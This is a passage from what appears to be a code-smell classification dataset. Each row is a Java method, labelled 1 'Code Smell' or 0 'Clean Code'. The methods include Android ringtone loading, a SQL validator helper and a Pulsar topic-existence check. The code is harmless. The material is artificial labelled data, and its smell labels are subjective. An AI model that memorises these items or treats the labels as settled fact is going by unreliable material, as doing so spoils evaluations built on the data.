      selectedTone=tone;
    }
    serverTones.add(tone);
  }
  RingtoneManager manager=new RingtoneManager(ApplicationLoader.applicationContext);
  manager.setType(RingtoneManager.TYPE_NOTIFICATION);
  Cursor cursor=manager.getCursor();
  Tone noSoundTone=new Tone();
  noSoundTone.stableId=stableIds++;
  noSoundTone.title=LocaleController.getString(""NoSound"",R.string.NoSound);
  noSoundTone.isSystemNoSound=true;
  systemTones.add(noSoundTone);
  Tone defaultTone=new Tone();
  defaultTone.stableId=stableIds++;
  defaultTone.title=LocaleController.getString(""DefaultRingtone"",R.string.DefaultRingtone);
  defaultTone.isSystemDefault=true;
  systemTones.add(defaultTone);
  if (startSelectedTone != null && startSelectedTone.document == null && startSelectedTone.uri.equals(""NoSound"")) {
    startSelectedTone=null;
    selectedTone=noSoundTone;
  }
  if (startSelectedTone != null && startSelectedTone.document == null && startSelectedTone.uri.equals(""Default"")) {
    startSelectedTone=null;
    selectedTone=defaultTone;
  }
  while (cursor.moveToNext()) {
    String notificationTitle=cursor.getString(RingtoneManager.TITLE_COLUMN_INDEX);
    String notificationUri=cursor.getString(RingtoneManager.URI_COLUMN_INDEX) + ""/"" + cursor.getString(RingtoneManager.ID_COLUMN_INDEX);
    Tone tone=new Tone();
    tone.stableId=stableIds++;
    tone.title=notificationTitle;
    tone.uri=notificationUri;
    if (startSelectedTone != null && startSelectedTone.document == null && startSelectedTone.uri.equals(notificationUri)) {
      startSelectedTone=null;
      selectedTone=tone;
    }
    systemTones.add(tone);
  }
  if (getMediaDataController().ringtoneDataStore.isLoaded() && selectedTone == null) {
    selectedTone=defaultTone;
    selectedToneChanged=true;
  }
  updateRows();
}",1,Code Smell
"/** 
 * Registers a query in a parent scope.
 * @param parentScope Parent scope which this scope turns to in order toresolve objects
 * @param usingScope  Scope whose child list this scope should add itself to
 * @param node        Query node
 * @param alias       Name of this query within its parent. Must be specifiedif usingScope != null
 */
private void registerQuery(SqlValidatorScope parentScope,SqlValidatorScope usingScope,SqlNode node,SqlNode enclosingNode,String alias,boolean forceNullable){
  Preconditions.checkArgument(usingScope == null || alias != null);
  registerQuery(parentScope,usingScope,node,enclosingNode,alias,forceNullable,true);
}
!org.eclipse.jdt.core.dom.MethodDeclaration@33e2c96e",0,Clean Code
"/** 
 * Verify whether the specified Topic exists under the specified Tenant/Namespace
 * @apiNote cannot compare whether the string contains, otherwise it may be misjudged, such as:Topic ""ab"" does not exist, but if ""abc"" exists, ""ab"" will be mistakenly judged to exist
 */
public boolean topicExists(PulsarClusterInfo pulsarClusterInfo,String tenant,String namespace,String topicName,boolean isPartitioned){
  if (StringUtils.isBlank(topicName)) {
    return true;
  }
  List<String> topics;
  boolean topicExists=false;
  try {
    if (isPartitioned) {
      topics=PulsarUtils.getPartitionedTopics(restTemplate,pulsarClusterInfo,tenant,namespace);
    }
 else {
      topics=PulsarUtils.getTopics(restTemplate,pulsarClusterInfo,tenant,namespace);
    }
    for (    String t : topics) {
      t=t.substring(t.lastIndexOf(""/"") + 1);
      if (!isPartitioned) {
        int suffixIndex=t.lastIndexOf(""-partition-"");
        if (suffixIndex > 0) {
          t=t.substring(0,suffixIndex);
        }
      }
      if (topicName.equals(t)) {
        topicExists=true;
        break;
      }
    }
  }
 catch (  Exception pe) {
    LOGGER.error(""check if the pulsar topic={} exists error, begin retry"",topicName,pe);
    int count=0;
    try {
      while (!topicExists && ++count <= RETRY_TIMES) {
        LOGGER.info(""check whether the pulsar topic={} exists error, try count={}"",topicName,count);
        Thread.sleep(DELAY_SECONDS);
        topics=PulsarUtils.getPartitionedTopics(restTemplate,pulsarClusterInfo,tenant,namespace);
        for (        String t : topics) {
          t=t.substring(t.lastIndexOf(""/"") + 1);
          if (topicName.equals(t)) {
            topicExists=true;
            break;
          }
        }
      }
    }
 catch (    Exception e) {
      LOGGER.error(""after retry, check if the pulsar topic={} exists still error"",topicName,pe);
    }
  }
  return topicExists;
}",1,Code Smell
